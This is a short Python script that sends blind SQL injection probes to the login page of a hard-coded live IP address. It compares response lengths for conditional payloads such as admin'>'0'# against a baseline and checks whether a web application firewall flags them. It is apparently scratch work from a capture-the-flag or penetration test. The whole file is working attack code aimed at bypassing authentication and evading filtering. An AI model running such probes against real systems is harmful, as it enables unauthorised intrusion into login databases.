import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php", data={"username": payload, "password": "x"})
    print(f"[{label:30}] len={len(r.text)} waf={'BLOCKED' if 'Suspicious' in r.text else 'clean'}")

test("admin'>'0'#", "cond-true-ish")
test("admin'>'9'#", "cond-false-ish")
test("nonexistentxyz123", "baseline-no-injection")
